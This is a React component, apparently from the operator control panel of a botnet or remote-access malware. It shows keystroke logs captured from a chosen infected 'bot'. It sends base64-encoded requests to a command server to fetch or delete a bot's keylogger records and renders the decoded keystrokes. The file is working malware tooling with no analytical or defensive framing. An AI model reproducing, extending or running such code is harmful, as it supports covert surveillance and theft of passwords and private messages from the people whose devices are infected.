import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import $ from 'jquery';

class LogsKeylogger extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            stateCMD:'',
            ResultOnLog:[]
        };
    }

    componentWillReceiveProps() {
        if(SettingsContext.start_modul != 'LogsKeyloggerModal'){
            return;
        }
        this.setState({
            ResultOnLog: []
        });
        this.SendLogsCommand();
    }

    Base64DecodeToStr(base64str) {
        return new Buffer(base64str.toString()  == null ? '' : base64str.toString(), 'base64').toString('utf-8');
    }

    SendLogsCommand(cmdName, deletethis) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer(
                    '{"sent_request":"logsKeylogger","idbot":"' + SettingsContext.CurrentSetBot + '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
           
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					//SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					if(isNullOrUndefined(deletethis)) {
						this.ParseResult(result);
					}
					else {
						// SettingsContext.ShowToast('success', 'logs delete success');
						// this.setState({
						// 	ResultOnLog: <Redirect to="/bots"/>
						// });
					}
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot cmd ' + cmdName + '. Look console for more details.');
               // console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }
    
    ParseResult(resultJSON) {
    let MyLogsArr = [];

        resultJSON.forEach(function(element) {
            MyLogsArr.push( <p class="colorLogs">★{this.Base64DecodeToStr(element)}</p>);
        }.bind(this));
        
        this.setState({
            ResultOnLog: MyLogsArr
        });
    }


    DeleteLogs(){
        let id =  SettingsContext.CurrentSetBot;
        id = id.replace('-','_');
        id = id.replace('-','_');
        id = id.replace('-','_');

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {'params': new Buffer('{"sent_request":"remove_table_focus_logger","idbot":"' + id + '"}').toString('base64')}
        });
        request.done(function(msg) {
			try {
                try_eval('$.notify("Clean", "info");');
            }catch (ErrMgs) {}
        }.bind(this));
    }

    UpdateLogs(){
        this.componentWillReceiveProps();
        try {
            try_eval('$.notify("Update logs", "info");');
        }catch (ErrMgs) {}
    }

    render () {
        return (

            <div class="modal fade" id="LogsKeyloggerModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-lg2" role="document">
                <div class="modal-content ">
                <div class="modal-header">
                    <h5>Logs keylogger ID: { SettingsContext.CurrentSetBot}</h5>

                    <div class="check-bot" style={({float: 'left', marginLeft: '20px',fontSize: '1rem'})}>
                    <i data-placement="bottom"  data-toggle="tooltip"  onClick={this.UpdateLogs.bind(this)} class="fas fa-sync"> <i>Update logs</i></i>
                    </div>

                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button>

                </div>
                
                <div style={({overflow: 'hidden'})}>
                <br/>
                <div class="check-bot" style={({float: 'left', marginLeft: '10px',fontSize: '1rem'})}><i data-placement="bottom"  data-toggle="tooltip" title="Clean saved logs" onClick={this.DeleteLogs.bind(this)} class="far fa-undo"> <i>Clean saved logs</i></i></div><br/>
                <br/>
                    <div  class="alllogs">
                        
                        <div style={({marginTop: '-20px', overflow: 'hidden'})}>
                            <div style={({width: '1000%'})}>
                                <div>
                                <br/>
                                    {this.state.ResultOnLog}
                                </div> 
                            </div>
                        </div>
                    
                    </div>
                    
                </div>

               
                
                </div>
            </div>
        </div>
     
        );
    }
}

export default LogsKeylogger;